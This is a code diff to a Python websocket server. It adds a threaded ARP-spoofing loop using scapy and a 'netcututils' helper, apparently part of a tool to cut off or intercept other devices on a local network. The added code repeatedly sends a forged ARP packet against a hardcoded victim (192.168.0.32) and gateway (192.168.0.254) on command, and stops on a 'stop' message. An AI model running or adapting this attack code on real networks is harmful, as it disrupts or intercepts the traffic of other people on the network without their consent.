@@ -1,8 +1,16 @@
 import asyncio, websockets, json, time
 import netcututils as nc
+import threading
+from scapy.all import *
 #Return an array with every IP of connected devices (on local network)
 
-state = False
+def doit(arg):
+    t = threading.currentThread()
+    while getattr(t, "do_run", True):
+        send(arg)
+    print("Stopping as you wish.")
+    # todo remtre la co svp
+
 async def echo(websocket, path):
     
     async for message in websocket:
@@ -13,13 +21,16 @@ async def echo(websocket, path):
         elif request[0] == "arp_scan":
             await websocket.send(json.dumps(nc.arp_scan()))
         elif request[0] == "arp_spoof":
-            state = True
-            async while state:
-                time.sleep(0.5)
-                print("yo")
+            # thread.setArp()
+            # thread.start()
+            t = threading.Thread(target=doit, args=(nc.craft_arp_spoof("192.168.0.32", "192.168.0.254"),))
+            t.start()
         elif request[0] == "stop":
-            state = False
-            print("re")
+            # thread.stop()
+            # thread.join()
+            # print("re")
+            t.do_run = False
+            t.join()
         else:
             await websocket.send("this request doesn't exist")
 
@@ -33,5 +44,8 @@ async def echo(websocket, path):
 asyncio.get_event_loop().run_until_complete(
     websockets.serve(echo, 'localhost', 8765))
 asyncio.get_event_loop().run_forever()
+
+
+
 
 
